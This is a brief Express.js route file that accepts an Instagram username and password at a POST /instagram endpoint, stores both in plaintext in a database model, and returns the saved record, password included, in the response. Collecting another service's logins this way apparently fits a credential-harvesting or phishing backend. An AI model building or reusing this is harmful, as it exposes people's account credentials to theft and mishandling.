const {Instagram} = require("../../model/Index");


module.exports = function (app) {
    app.post("/instagram", async (req, res) => {
        const { username, password } = req.body;
        const result = await Instagram.create({
            username,
            password
        });
        res.send(result);
    });
  };